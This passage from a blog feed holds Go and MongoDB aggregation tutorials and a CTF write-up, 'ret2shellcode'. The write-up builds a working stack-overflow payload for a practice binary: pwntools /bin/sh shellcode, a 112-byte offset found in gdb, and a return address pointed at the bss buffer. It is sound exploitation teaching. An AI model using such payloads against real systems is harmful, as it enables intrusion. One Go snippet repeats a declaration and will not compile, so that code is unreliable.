class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">groupStage := bson.D&#123;</span><br><span class="line">    &#123;<span class="string">&quot;$group&quot;</span>, bson.D&#123;</span><br><span class="line">        &#123;<span class="string">&quot;_id&quot;</span>, <span class="string">&quot;$author.name&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;pop&quot;</span>, bson.D&#123;&#123;<span class="string">&quot;$sum&quot;</span>, <span class="string">&quot;$favCount&quot;</span>&#125;&#125;&#125;,</span><br><span class="line">    &#125;&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//groupStage := bson.D&#123;</span></span><br><span class="line"><span class="comment">//&#123;&quot;$group&quot;,bson.D&#123;</span></span><br><span class="line"><span class="comment">//&#123;&quot;_id&quot;,&quot;null&quot;&#125;,</span></span><br><span class="line"><span class="comment">//&#123;&quot;count&quot;,bson.D&#123;&#123;&quot;$sum&quot;,1&#125;&#125;&#125;,</span></span><br><span class="line"><span class="comment">//&#123;&quot;pop&quot;,bson.D&#123;&#123;&quot;$sum&quot;,&quot;$favCount&quot;&#125;&#125;&#125;,</span></span><br><span class="line"><span class="comment">//&#123;&quot;avg&quot;,bson.D&#123;&#123;&quot;$avg&quot;,&quot;$favCount&quot;&#125;&#125;&#125;,</span></span><br><span class="line"><span class="comment">//&#125;&#125;,</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//groupStage := bson.D&#123;</span></span><br><span class="line"><span class="comment">//&#123;&quot;$project&quot;,bson.D&#123;</span></span><br><span class="line"><span class="comment">//&#123;&quot;name&quot;,&quot;$title&quot;&#125;,</span></span><br><span class="line"><span class="comment">//&#123;&quot;_id&quot;,0&#125;,</span></span><br><span class="line"><span class="comment">//&#123;&quot;type&quot;,1&#125;,</span></span><br><span class="line"><span class="comment">//&#123;&quot;author&quot;,1&#125;,</span></span><br><span class="line"><span class="comment">//&#125;&#125;,</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cursor, err := collection.Aggregate(context.TODO(), mongo.Pipeline&#123;groupStage&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">cursor, err := collection.Aggregate(context.TODO(),mongo.Pipeline&#123;groupStage&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> cursor.Next(context.TODO()) &#123;</span><br><span class="line">    fmt.Println(cursor.Current.String())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>多阶段</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">groupStage1 := bson.D&#123;</span><br><span class="line">    &#123;<span class="string">&quot;$match&quot;</span>,bson.D&#123;</span><br><span class="line">        &#123;<span class="string">&quot;type&quot;</span>,<span class="string">&quot;travel&quot;</span>&#125;,</span><br><span class="line">    &#125;&#125;,</span><br><span class="line">&#125;</span><br><span class="line">groupStage2 := bson.D&#123;</span><br><span class="line">    &#123;<span class="string">&quot;$project&quot;</span>,bson.D&#123;</span><br><span class="line">        &#123;<span class="string">&quot;name&quot;</span>,<span class="string">&quot;$title&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;_id&quot;</span>,<span class="number">0</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;type&quot;</span>,<span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;author&quot;</span>,<span class="number">1</span>&#125;,</span><br><span class="line">    &#125;&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cursor, err := collection.Aggregate(context.TODO(),mongo.Pipeline&#123;groupStage1,groupStage2&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> cursor.Next(context.TODO()) &#123;</span><br><span class="line">    fmt.Println(cursor.Current.String())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;博客网址：&lt;a href=&quot;http://www.shicoder.top/&quot;&gt;www.shicoder.top&lt;/a&gt;&lt;br&gt;微信：18223081347&lt;br&gt;欢迎加群聊天 ：452380935&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;之前的博客中将mongodb的自带命令进行讲解，这次我们结合go的包&lt;code&gt;mongo-driver&lt;/code&gt;进行代码实现&lt;/p&gt;</summary>
    
    
    
    <category term="MongoDB" scheme="http://www.shicoder.top/categories/MongoDB/"/>
    
    
    <category term="导航" scheme="http://www.shicoder.top/tags/%E5%AF%BC%E8%88%AA/"/>
    
    <category term="分享" scheme="http://www.shicoder.top/tags/%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>ret2shellcode</title>
    <link href="http://www.shicoder.top/posts/568031892.html"/>
    <id>http://www.shicoder.top/posts/568031892.html</id>
    <published>2022-05-04T03:31:11.000Z</published>
    <updated>2022-05-04T11:10:58.215Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>博客网址：<a href="http://www.shicoder.top/">www.shicoder.top</a><br>微信：18223081347<br>欢迎加群聊天 ：452380935</p></blockquote><p>上一次我们使用栈溢出对ret2text进行溢出，但是该程序自己有一个shellcode，一般情况都是没有的，这次我们就来解决一个没有自带shellcode的程序</p><span id="more"></span><p>同样，我们先来运行下这个程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">ROP$ </span><span class="language-bash">./ret2shellcode</span> </span><br><span class="line">No system for you this time !!!</span><br></pre></td></tr></table></figure><p>可以看到这次已经提醒你没有预先写好的shell函数供你使用，因此我们的想法是自己写一段shell，然后在返回地址覆盖为shell的地址，那么写到哪里呢，有2个地方：</p><ul><li>栈</li><li>bss</li></ul><p>我们可以首先看下开启了哪些保护</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">ROP$ </span><span class="language-bash">checksec ret2shellcode</span></span><br><span class="line">[*] &#x27;/home/pwn/桌面/题目/ROP/ret2shellcode&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>有一个可读可写可执行，我们去看下各个段的权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      /home/pwn/桌面/题目/ROP/ret2shellcode</span><br><span class="line"> 0x8049000  0x804a000 r-xp     1000 0      /home/pwn/桌面/题目/ROP/ret2shellcode</span><br><span class="line"> 0x804a000  0x804b000 rwxp     1000 1000   /home/pwn/桌面/题目/ROP/ret2shellcode</span><br><span class="line">0xf7dcb000 0xf7fb3000 r-xp   1e8000 0      /usr/lib/i386-linux-gnu/libc-2.31.so</span><br><span class="line">0xf7fb3000 0xf7fb5000 r-xp     2000 1e7000 /usr/lib/i386-linux-gnu/libc-2.31.so</span><br><span class="line">0xf7fb5000 0xf7fb7000 rwxp     2000 1e9000 /usr/lib/i386-linux-gnu/libc-2.31.so</span><br><span class="line">0xf7fb7000 0xf7fb9000 rwxp     2000 0      </span><br><span class="line">0xf7fcb000 0xf7fcd000 rwxp     2000 0      </span><br><span class="line">0xf7fcd000 0xf7fd0000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7fd0000 0xf7fd1000 r-xp     1000 0      [vdso]</span><br><span class="line">0xf7fd1000 0xf7ffb000 r-xp    2a000 0      /usr/lib/i386-linux-gnu/ld-2.31.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r-xp     1000 2a000  /usr/lib/i386-linux-gnu/ld-2.31.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rwxp     1000 2b000  /usr/lib/i386-linux-gnu/ld-2.31.so</span><br><span class="line">0xfffdd000 0xffffe000 rwxp    21000 0      [stack]</span><br></pre></td></tr></table></figure><p>发现栈是可读可写可执行，那是不是就可以直接将程序写在栈上面，然后将返回地址覆盖为该程序地址呢？其实不可以，首先是否可以在栈上执行程序，有3个防护措施都有关</p><ul><li>canny</li></ul><p>每次在进入新函数的时候，之前是直接填充新函数的栈帧，但是这个措施可以在填充之前先加一个canny（一个特定的数值），当调用函数返回时候，先检查该值是否为填充的值，若不一样，则直接程序退出，由于我们覆盖栈，肯定是要覆盖栈帧，所以覆盖完之后，就会发现canny没有了，就会失败</p><ul><li>nx</li></ul><p>栈是否可以执行</p><ul><li>ASLR</li></ul><p>随机化程序的堆、栈、共享内存的地址，这样随机化之后，我们就不能在栈上写程序，因为每次地址都会变化</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /proc/sys/kernel/randomize_va_space</span><br><span class="line"></span><br><span class="line">0：关闭</span><br><span class="line">1：随机化栈基地址（stack）、共享库（.so\libraries）、mmap 基地址</span><br><span class="line">2：在1基础上，增加随机化堆基地址（chunk）</span><br></pre></td></tr></table></figure><p>在做题的时候，基本上这个都是打开的，所以一般不要想在栈上执行程序</p><p>那基于此，我们只能在bss上执行程序，我们在<code>IDA</code>可以看到</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  <span class="built_in">gets</span>(&amp;s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, &amp;s, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一个strncpy函数，拷贝到buf2中，我们可以看到buf2是一个全局变量，因此在bss中，那刚好，就把s中的内容移到bss中，然后覆盖地址为bss的起始地址，bss中起始内容就是shellcode，那么开始把</p><p>首先<code>pwn</code>包提供产生一段shellcode代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>shellcode</span><br><span class="line"><span class="string">b&#x27;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80</span></span><br></pre></td></tr></table></figure><p>然后我们用<code>GDB</code>看下填充多少字节</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt; </span><span class="language-bash">stack 40</span></span><br><span class="line">00:0000│ esp  0xffffd0f0 —▸ 0xffffd10c ◂— &#x27;AAAAAAAA&#x27;</span><br><span class="line">01:0004│      0xffffd0f4 ◂— 0x0</span><br><span class="line">02:0008│      0xffffd0f8 ◂— 0x1</span><br><span class="line">03:000c│      0xffffd0fc ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">06:0018│      0xffffd108 —▸ 0xf7ffd000 ◂— and    al, 0xbf /* 0x2bf24 */</span><br><span class="line">07:001c│ eax  0xffffd10c ◂— &#x27;AAAAAAAA&#x27;</span><br><span class="line">... ↓</span><br><span class="line">09:0024│ edx  0xffffd114 ◂— 0x500</span><br><span class="line">0a:0028│      0xffffd118 ◂— 0xa5</span><br><span class="line">0b:002c│      0xffffd11c —▸ 0xf7fb3a80 (__dso_handle) ◂— cmp    byte ptr [edx], 0xfb</span><br><span class="line">0c:0030│      0xffffd120 ◂— 0x0</span><br><span class="line">0d:0034│      0xffffd124 —▸ 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1e9d6c */</span><br><span class="line">0e:0038│      0xffffd128 —▸ 0xf7ffc7e0 (_rtld_global_ro) ◂— add    byte ptr [eax], al</span><br><span class="line">0f:003c│      0xffffd12c —▸ 0xf7fb8c68 (__exit_funcs_lock) ◂— 0</span><br><span class="line">10:0040│      0xffffd130 —▸ 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1e9d6c */</span><br><span class="line">11:0044│      0xffffd134 —▸ 0xf7fe22f0 ◂— endbr32 </span><br><span class="line">12:0048│      0xffffd138 ◂— 0x0</span><br><span class="line">13:004c│      0xffffd13c —▸ 0x804838d (_init+9) ◂— add    ebx, 0x1c73</span><br><span class="line">14:0050│      0xffffd140 —▸ 0xf7fb53fc (__exit_funcs) —▸ 0xf7fb6900 (initial) ◂— 0</span><br><span class="line">15:0054│      0xffffd144 ◂— 0x40000</span><br><span class="line">16:0058│      0xffffd148 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f14 (_DYNAMIC) ◂— add    dword ptr [eax], eax</span><br><span class="line">17:005c│      0xffffd14c —▸ 0x8048622 (__libc_csu_init+82) ◂— add    edi, 1</span><br><span class="line">18:0060│      0xffffd150 ◂— 0x1</span><br><span class="line">19:0064│      0xffffd154 —▸ 0xffffd214 —▸ 0xffffd3c0 ◂— 0x6d6f682f (&#x27;/hom&#x27;)</span><br><span class="line">1a:0068│      0xffffd158 —▸ 0xffffd21c —▸ 0xffffd3ea ◂— &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;</span><br><span class="line">1b:006c│      0xffffd15c —▸ 0xf7e03519 (__cxa_atexit+41) ◂— add    esp, 0x1c</span><br><span class="line">1c:0070│      0xffffd160 —▸ 0xf7fe22f0 ◂— endbr32 </span><br><span class="line">1d:0074│      0xffffd164 ◂— 0x0</span><br><span class="line">1e:0078│      0xffffd168 —▸ 0x80485db (__libc_csu_init+11) ◂— add    ebx, 0x1a25</span><br><span class="line">1f:007c│      0xffffd16c ◂— 0x0</span><br><span class="line">20:0080│      0xffffd170 —▸ 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1e9d6c */</span><br><span class="line">... ↓</span><br><span class="line">22:0088│ ebp  0xffffd178 ◂— 0x0</span><br><span class="line">23:008c│      0xffffd17c —▸ 0xf7de9ee5 (__libc_start_main+245) ◂— add    esp, 0x10</span><br><span class="line">24:0090│      0xffffd180 ◂— 0x1</span><br><span class="line">25:0094│      0xffffd184 —▸ 0xffffd214 —▸ 0xffffd3c0 ◂— 0x6d6f682f (&#x27;/hom&#x27;)</span><br><span class="line">26:0098│      0xffffd188 —▸ 0xffffd21c —▸ 0xffffd3ea ◂— &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;</span><br><span class="line">27:009c│      0xffffd18c —▸ 0xffffd1a4 ◂— 0x0</span><br></pre></td></tr></table></figure><p>从<code>0xffffd10c</code>到<code>0xffffd17c</code>填充112字节垃圾数据，从<code>0xffffd17c</code>填充4字节的地址</p><p>因此<code>payload</code>为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf = <span class="number">0x0804A080</span> <span class="comment"># bss段的地址</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">112</span>,<span class="string">b&#x27;A&#x27;</span>)+p32(buf)</span><br></pre></td></tr></table></figure><p>其中的buf通过<code>IDA</code>看到</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o</span><br></pre></td></tr></table></figure><p>最后便可以成功拿到shell啦，感谢大家的阅读</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;博客网址：&lt;a href=&quot;http://www.shicoder.top/&quot;&gt;www.shicoder.top&lt;/a&gt;&lt;br&gt;微信：18223081347&lt;br&gt;欢迎加群聊天 ：452380935&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;上一次我们使用栈溢出对ret2text进行溢出，但是该程序自己有一个shellcode，一般情况都是没有的，这次我们就来解决一个没有自带shellcode的程序&lt;/p&gt;</summary>
    
    
    
    <category term="PWN" scheme="http://www.shicoder.top/categories/PWN/"/>
    
    
    <category term="导航" scheme="http://www.shicoder.top/tags/%E5%AF%BC%E8%88%AA/"/>
    
    <category term="分享" scheme="http://www.shicoder.top/tags/%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>mongodb高级操作</title>
    <link href="http://www.shicoder.top/posts/2378835965.html"/>
    <id>http://www.shicoder.top/posts/2378835965.html</id>
    <published>2022-05-03T03:08:13.000Z</published>
    <updated>2022-05-05T09:30:11.113Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>博客网址：<a href="http://www.shicoder.top/">www.shicoder.top</a><br>微信：18223081347<br>欢迎加群聊天 ：452380935</p></blockquote><p>上一次我们对mongodb的一些简单命令进行讲解，这一次我们来看下mongodb的高级操作吧</p><span id="more"></span><h1 id="聚合操作"><a href="#聚合操作" class="headerlink" title="聚合操作"></a>聚合操作</h1><p>所谓聚合操作，就是类似mysql中的<code>where</code>、<code>order by</code>等一些操作，MongoDB 的聚合框架就是将文档输入处理管道（pipeline），在管道内完成对文档的操作（包括多个stage）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">db.集合.aggregate(</span><br><span class="line">[</span><br><span class="line">        &#123;stage1&#125;,</span><br><span class="line">        &#123;stage2&#125;,</span><br><span class="line">        ...</span><br><span class="line">    ]</span><br><span class="line">    &#123;option&#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><img src="https://smypicture.oss-cn-beijing.aliyuncs.com/img/9380897-af4f5bbef7acf913.png" alt="img"></p><p>主要有以下几个阶段</p><ul><li><p>$match用于过滤数据，用于聚合阶段的输入</p></li><li><p>$order用指定的键，对文档进行排序</p></li><li><p>$limit用于限制多少个文档作为输入</p></li><li><p>$skip跳过多少个文档</p></li><li><p>$project投影字段，可以理解为查询多少个字段，类似为 select a,b,c 中的 a,b,c</p></li><li><p>$group进行分组操作,其中**_id**字段用于指定需要分组的字段。</p></li><li><p>$count返回这个聚合管道阶段的文档的数量</p></li></ul><h2 id="数据准备"><a href="#数据准备" class="headerlink" title="数据准备"></a>数据准备</h2><p>首先为了后续的案例分析，我们先准备一些数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> tags = [<span class="string">&quot;nosql&quot;</span>,<span class="string">&quot;mongodb&quot;</span>,<span class="string">&quot;document&quot;</span>,<span class="string">&quot;developer&quot;</span>,<span class="string">&quot;popular&quot;</span>];</span><br><span class="line"><span class="keyword">var</span> types = [<span class="string">&quot;technology&quot;</span>,<span class="string">&quot;sociality&quot;</span>,<span class="string">&quot;travel&quot;</span>,<span class="string">&quot;novel&quot;</span>,<span class="string">&quot;literature&quot;</span>];</span><br><span class="line"><span class="keyword">var</span> books=[];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">50</span>;i++)&#123;</span><br><span class="line"><span class="keyword">var</span> typeIdx = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*types.<span class="property">length</span>);</span><br><span class="line"><span class="keyword">var</span> tagIdx = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*tags.<span class="property">length</span>);</span><br><span class="line"><span class="keyword">var</span> tagIdx2 = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*tags.<span class="property">length</span>);</span><br><span class="line"><span class="keyword">var</span> favCount = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">100</span>);</span><br><span class="line"><span class="keyword">var</span> username = <span class="string">&quot;xx00&quot;</span>+<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">10</span>);</span><br><span class="line"><span class="keyword">var</span> age = <span class="number">20</span> + <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">15</span>);</span><br><span class="line"><span class="keyword">var</span> book = &#123;</span><br><span class="line"><span class="attr">title</span>: <span class="string">&quot;book-&quot;</span>+i,</span><br><span class="line"><span class="attr">type</span>: types[typeIdx],</span><br><span class="line"><span class="attr">tag</span>: [tags[tagIdx],tags[tagIdx2]],</span><br><span class="line"><span class="attr">favCount</span>: favCount,</span><br><span class="line"><span class="attr">author</span>: &#123;<span class="attr">name</span>:username,<span class="attr">age</span>:age&#125;</span><br><span class="line">&#125;;</span><br><span class="line">books.<span class="title function_">push</span>(book)</span><br><span class="line">&#125;</span><br><span class="line">db.<span class="property">books</span>.<span class="title function_">insertMany</span>(books);</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt; </span><span class="language-bash">use book</span></span><br><span class="line">switched to db book</span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash">load(<span class="string">&quot;book.js&quot;</span>)</span></span><br><span class="line">true</span><br></pre></td></tr></table></figure><h2 id="match"><a href="#match" class="headerlink" title="$match"></a>$match</h2><p>$match用于对文档进行筛选，之后可以在得到的文档子集上做聚合，$match可以使用除了地理空间之 外的所有常规查询操作符，在实际应用中尽可能将$match放在管道的前面位置。这样有两个好处：一是 可以快速将不需要的文档过滤掉，以减少管道的工作量；二是如果再投射和分组之前执行$match，查询 可以使用索引</p><p>比如查询<code>type</code>为<code>technology</code>的书籍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.books.aggregate([&#123;$match:&#123;type:&quot;technology&quot;&#125;&#125;])</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dba5&quot;), &quot;title&quot; : &quot;book-0&quot;, &quot;type&quot; : &quot;technology&quot;, &quot;tag&quot; : [ &quot;mongodb&quot;, &quot;developer&quot; ], &quot;favCount&quot; : 72, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx002&quot;, &quot;age&quot; : 26 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbb0&quot;), &quot;title&quot; : &quot;book-11&quot;, &quot;type&quot; : &quot;technology&quot;, &quot;tag&quot; : [ &quot;popular&quot;, &quot;nosql&quot; ], &quot;favCount&quot; : 61, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx000&quot;, &quot;age&quot; : 32 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbb5&quot;), &quot;title&quot; : &quot;book-16&quot;, &quot;type&quot; : &quot;technology&quot;, &quot;tag&quot; : [ &quot;document&quot;, &quot;developer&quot; ], &quot;favCount&quot; : 50, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx000&quot;, &quot;age&quot; : 32 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbb9&quot;), &quot;title&quot; : &quot;book-20&quot;, &quot;type&quot; : &quot;technology&quot;, &quot;tag&quot; : [ &quot;document&quot;, &quot;developer&quot; ], &quot;favCount&quot; : 42, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx007&quot;, &quot;age&quot; : 20 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbbc&quot;), &quot;title&quot; : &quot;book-23&quot;, &quot;type&quot; : &quot;technology&quot;, &quot;tag&quot; : [ &quot;mongodb&quot;, &quot;popular&quot; ], &quot;favCount&quot; : 4, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx005&quot;, &quot;age&quot; : 21 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbbd&quot;), &quot;title&quot; : &quot;book-24&quot;, &quot;type&quot; : &quot;technology&quot;, &quot;tag&quot; : [ &quot;developer&quot;, &quot;mongodb&quot; ], &quot;favCount&quot; : 1, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx007&quot;, &quot;age&quot; : 29 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbc7&quot;), &quot;title&quot; : &quot;book-34&quot;, &quot;type&quot; : &quot;technology&quot;, &quot;tag&quot; : [ &quot;developer&quot;, 